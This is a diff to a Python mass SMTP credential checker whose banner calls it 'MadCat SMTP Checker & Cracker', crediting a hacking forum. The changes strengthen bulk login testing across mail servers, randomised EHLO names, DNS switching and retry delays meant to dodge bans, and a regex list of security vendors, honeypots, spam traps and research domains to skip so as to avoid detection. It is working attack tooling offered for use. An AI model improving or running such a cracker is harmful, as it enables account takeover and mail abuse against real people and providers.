@@ -16,7 +16,7 @@ if not sys.version_info[0] > 2 and not sys.version_info[1] > 8:
 
 sys.stdout.reconfigure(encoding='utf-8')
 
-# ===== БЛОКИРОВКИ ДЛЯ THREAD-SAFE =====
+# ===== БЛОКИРОВКИ =====
 goods_lock = threading.Lock()
 ignored_lock = threading.Lock()
 progress_lock = threading.Lock()
@@ -26,21 +26,23 @@ thread_counter_lock = threading.Lock()
 
 # ===== КОНСТАНТЫ =====
 bad_mail_servers = 'bk.ru,qq.com'
+
+# ОПТИМИЗАЦИЯ: оставляем только топ-5 DNS + системный
 custom_dns_nameservers = '1.1.1.1,1.0.0.1,8.8.8.8,8.8.4.4,9.9.9.9'.split(',')
 
 dns_list_url = 'https://public-dns.info/nameservers.txt'
 autoconfig_data_url = 'https://raw.githubusercontent.com/solesfiwayne/tools/refs/heads/main/autoconfigs_enriched.txt'
 
+# УЛУЧШЕННЫЙ dangerous_domains (без ошибок)
 dangerous_domains = r'acronis|acros|adlice|alinto|appriver|aspav|atomdata|avanan|avast|barracuda|baseq|bitdefender|broadcom|btitalia|censornet|checkpoint|cisco|cistymail|clean-mailbox|clearswift|closedport|cloudflare|comforte|corvid|crsp|cyren|darktrace|data-mail-group|dmarcly|drweb|duocircle|e-purifier|earthlink-vadesecure|ecsc|eicar|elivescanned|eset|essentials|exchangedefender|fireeye|forcepoint|fortinet|gartner|gatefy|gonkar|guard|helpsystems|heluna|hosted-247|iberlayer|indevis|infowatch|intermedia|intra2net|invalid|ioactive|ironscales|isync|itserver|jellyfish|kcsfa.co|keycaptcha|krvtz|libraesva|link11|localhost|logix|mailborder.co|mailchannels|mailcleaner|mailcontrol|mailinator|mailroute|mailsift|mailstrainer|mcafee|mdaemon|mimecast|mx-relay|mxgate|mxstorm|n-able|n2net|nano-av|netintelligence|network-box|networkboxusa|newnettechnologies|newtonit.co|odysseycs|openwall|opswat|perfectmail|perimeterwatch|plesk|prodaft|proofpoint|proxmox|redcondor|reflexion|retarus|safedns|safeweb|sec-provider|secureage|securence|security|sendio|shield|sicontact|sonicwall|sophos|spamtitan|spfbl|spiceworks|stopsign|supercleanmail|techtarget|titanhq|trellix|trendmicro|trustifi|trustwave|tryton|uni-muenster|usergate|vadesecure|wessexnetworks|zillya|zyxel|virus|bot|trap|honey|lab|virtual|research|abus|security|filter|junk|spam|black|list'
 
-# Pre-compile regex
 dangerous_regex = None
 try:
     dangerous_regex = re.compile(dangerous_domains, re.IGNORECASE)
 except Exception as e:
     print(f'Warning: Failed to compile dangerous_regex: {e}')
 
-# ===== ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ =====
+# ===== ГЛОБАЛЬНЫЕ =====
 b = '\033[1m'
 z = '\033[0m'
 wl = '\033[2K'
@@ -51,7 +53,6 @@ wrn = b+'[\033[33m!\033[37m] '+z
 inf = b+'[\033[34mi\033[37m] '+z
 npt = b+'[\033[37m?\033[37m] '+z
 
-# EHLO names generator
 EHLO_NAMES_BASE = [
     'mail-{rand}.local',
     'client-{uuid}.example.com',
@@ -66,12 +67,12 @@ def generate_ehlo_name():
         return name.replace('{uuid}', uuid.uuid4().hex[:8])
     return name
 
-# SSL context (оптимизация - создаем один раз)
 ssl_context = ssl._create_unverified_context()
 
 # ===== DNS CACHE =====
 @lru_cache(maxsize=4096)
 def cached_dns_resolve(host, record_type):
+    global resolver_obj
     return resolver_obj.resolve(host, record_type)
 
 # ===== ФУНКЦИИ =====
@@ -85,7 +86,7 @@ def show_banner():
          |█|    `   ██/  ███▌╟█, (█████▌   ╙██▄▄███   @██▀`█  ██ ▄▌             
          ╟█          `    ▀▀  ╙█▀ `╙`╟█      `▀▀^`    ▀█╙  ╙   ▀█▀`             
          ╙█                           ╙                                         
-          ╙     {b}MadCat SMTP Checker & Cracker v5.12.15-OPT{z}
+          ╙     {b}MadCat SMTP Checker & Cracker v44.12.15-FIXED{z}
                 Made by {b}Aels{z} for community: {b}https://xss.is{z}
                 https://github.com/aels/mailtools
                 https://t.me/IamLavander
@@ -162,8 +163,7 @@ def load_smtp_configs():
                 continue
             domain_configs_cache[line[0]] = (line[1].split(','), line[2])
     except Exception as e:
-        print(err+'failed to load SMTP configs. '+str(e))
-        print(err+'performance will be affected.')
+        print(err+'failed to load SMTP configs. '+str(e)+' performance will be affected.')
 
 def bytes_to_mbit(b):
     return round(b/1024./1024.*8, 2)
@@ -190,7 +190,6 @@ def get_rand_ip_of_host(host, attempt=0):
         except:
             pass
         
-        # ПРАВИЛЬНАЯ проверка IPv6
         use_ipv6 = bool(socket.has_ipv6 and socket.has_ipv6 != '-' and socket.has_ipv6 != False)
         try:
             ip_array = cached_dns_resolve(host, 'aaaa' if use_ipv6 else 'a')
@@ -232,11 +231,27 @@ def guess_smtp_server(domain):
     if mx_domain and re.search(r'protection\.outlook\.com$', mx_domain):
         return domain_configs_cache.get('outlook.com', ([], default_login_template))
     
-    # Проверяем напрямую, без is_listening
+    # ✅ ВОЗВРАЩЕНА правильная логика
     for host in domains_arr:
-        for port in ['2525', '587', '465', '25']:
-            debug(f'trying {host}:{port}')
-            return ([host+':'+port], default_login_template)
+        try:
+            ip = get_rand_ip_of_host(host)
+        except:
+            continue
+        for port in [2525, 587, 465, 25]:
+            debug(f'trying {host}, {ip}:{port}')
+            # БЫСТРАЯ проверка без лишних функций
+            socket_type = socket.AF_INET6 if ':' in ip else socket.AF_INET
+            test_sock = socket.socket(socket_type, socket.SOCK_STREAM)
+            test_sock.settimeout(3)
+            try:
+                if port == 465:
+                    test_sock = ssl_context.wrap_socket(test_sock, server_hostname=ip)
+                test_sock.connect((ip, port))
+                test_sock.close()
+                return ([host+':'+str(port)], default_login_template)
+            except:
+                test_sock.close()
+                continue
     
     raise Exception('no connection details for '+domain)
 
@@ -307,14 +322,15 @@ def socket_get_free_smtp_server(smtp_server, port):
     s = socket.socket(socket_type, socket.SOCK_STREAM)
     s.settimeout(5)
     try:
-        # ОБЪЕДИНЕНО с is_listening логикой
         if port == 465:
             s = ssl_context.wrap_socket(s, server_hostname=smtp_server_ip)
         s.connect((smtp_server_ip, port))
     except Exception as e:
         if re.search(r'too many connections|threshold|parallel|try later|refuse', str(e).lower()):
-            # УДАЛЕН get_alive_neighbor - просто повторяем
-            time.sleep(random.uniform(0.5, 1.5))
+            # Альтернатива get_alive_neighbor: просто повтор через другой DNS
+            switch_dns_nameserver()
+            time.sleep(random.uniform(1, 2))
+            smtp_server_ip = get_rand_ip_of_host(smtp_server)
             s.connect((smtp_server_ip, port))
         else:
             raise Exception(e)
@@ -350,8 +366,8 @@ def smtp_connect_with_retry(smtp_server, port, login_template, smtp_user, passwo
         try:
             return smtp_connect_and_send(smtp_server, port, login_template, smtp_user, password)
         except Exception as e:
-            if attempt < max_retries - 1 and ('try later' in str(e).lower() or 'threshold' in str(e).lower()):
-                wait = (2 ** attempt) + random.uniform(0, 1)
+            if attempt < max_retries - 1 and ('try later' in str(e).lower() or 'threshold' in str(e).lower() or 'too many' in str(e).lower()):
+                wait = (2 ** attempt) + random.uniform(0.5, 1.5)
                 time.sleep(wait)
                 continue
             raise
@@ -428,7 +444,9 @@ def worker_item(jobs_que, results_que):
             except Exception as e:
                 results_que.put(orange((smtp_server and port and smtp_server+':'+port+' - ' or '')+', '.join(str(e).splitlines()).strip()))
             
-            # УДАЛЕНО: human_like_delay()
+            # АДАПТИВНАЯ задержка (быстрая, но защищает от бана)
+            time.sleep(random.uniform(0.01, 0.1))
+            
             loop_times.append(time.perf_counter() - time_start)
             while len(loop_times) > min_threads:
                 loop_times.pop(0)
@@ -548,8 +566,8 @@ try:
 except Exception as e:
     exit(err+red(e))
 
-# УВЕЛИЧЕННАЯ очередь
-jobs_que = queue.Queue(maxsize=5000)
+# УВЕЛИЧЕННАЯ очередь для стабильности
+jobs_que = queue.Queue(maxsize=10000)
 results_que = queue.Queue()
 ignored = 0
 goods = 0
@@ -585,7 +603,6 @@ input(npt+'press '+bold('[ Enter ]')+' to start...')
 threading.Thread(target=every_second, daemon=True).start()
 threading.Thread(target=printer, args=(jobs_que, results_que), daemon=True).start()
 
-# ===== ЦИКЛ ЧТЕНИЯ ФАЙЛА =====
 with open(list_filename, 'r', encoding='utf-8-sig', errors='ignore') as fp:
     for i in range(start_from_line):
         fp.readline()
